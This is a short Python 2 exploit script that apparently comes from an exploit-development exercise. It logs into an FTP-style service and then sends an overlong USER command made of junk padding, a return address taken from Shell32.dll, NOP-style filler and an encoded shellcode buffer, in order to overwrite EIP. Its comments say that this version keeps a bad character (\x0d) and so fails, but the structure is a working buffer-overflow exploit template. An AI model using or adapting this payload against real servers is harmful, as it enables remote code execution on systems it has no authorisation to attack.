#!/usr/bin/python

import socket
import sys

junk = b"A" * 230
eip_override = b"\xD7\x30\x9D\x7C" #7C9D30D7 -- Shell32.dll
NOPS = b"C" * 140

buf =  b""
buf += b"\xbd\xa5\x23\xa4\x36\xdd\xc5\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x31\x31\x6a\x13\x83\xea\xfc\x03\x6a\xaa\xc1"
buf += b"\x51\xca\x5c\x87\x9a\x33\x9c\xe8\x13\xd6\xad\x28\x47"
buf += b"\x92\x9d\x98\x03\xf6\x11\x52\x41\xe3\xa2\x16\x4e\x04"
buf += b"\x03\x9c\xa8\x2b\x94\x8d\x89\x2a\x16\xcc\xdd\x8c\x27"
buf += b"\x1f\x10\xcc\x60\x42\xd9\x9c\x39\x08\x4c\x31\x4e\x44"
buf += b"\x4d\xba\x1c\x48\xd5\x5f\xd4\x6b\xf4\xf1\x6f\x32\xd6"
buf += b"\xf0\xbc\x4e\x5f\xeb\xa1\x6b\x29\x80\x11\x07\xa8\x40"
buf += b"\x68\xe8\x07\xad\x45\x1b\x59\xe9\x61\xc4\x2c\x03\x92"
buf += b"\x79\x37\xd0\xe9\xa5\xb2\xc3\x49\x2d\x64\x28\x68\xe2"
buf += b"\xf3\xbb\x66\x4f\x77\xe3\x6a\x4e\x54\x9f\x96\xdb\x5b"
buf += b"\x70\x1f\x9f\x7f\x54\x44\x7b\xe1\xcd\x20\x2a\x1e\x0d"
buf += b"\x8b\x93\xba\x45\x21\xc7\xb6\x07\x2f\x16\x44\x32\x1d"
buf += b"\x18\x56\x3d\x31\x71\x67\xb6\xde\x06\x78\x1d\x9b\xf9"
buf += b"\x32\x3c\x8d\x91\x9a\xd4\x8c\xff\x1c\x03\xd2\xf9\x9e"
buf += b"\xa6\xaa\xfd\xbf\xc2\xaf\xba\x07\x3e\xdd\xd3\xed\x40"
buf += b"\x72\xd3\x27\x23\x15\x47\xab\x8a\xb0\xef\x4e\xd3"
# This buf shell code has a bad character which is \x0d

payload = junk + eip_override + NOPS + buf

server_ip = str(sys.argv[1])
server_port = int(sys.argv[2])

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "\nNow sending the malicious payload, which includes bad characters that we identified ealier.\n"
soc.connect((server_ip, server_port))
d = soc.recv(1024)

soc.send('USER someone' + '\r\n')
d = soc.recv(1024)

soc.send('PASS someone' + '\r\n')
d = soc.recv(1024)

soc.send('USER ' + payload + '\r\n')
d = soc.recv(1024)

soc.close()

print "\nDone sending the payload with the bad characters which will result in an unsuccessful exploitation because the specifc program cannot handle the bad characters."
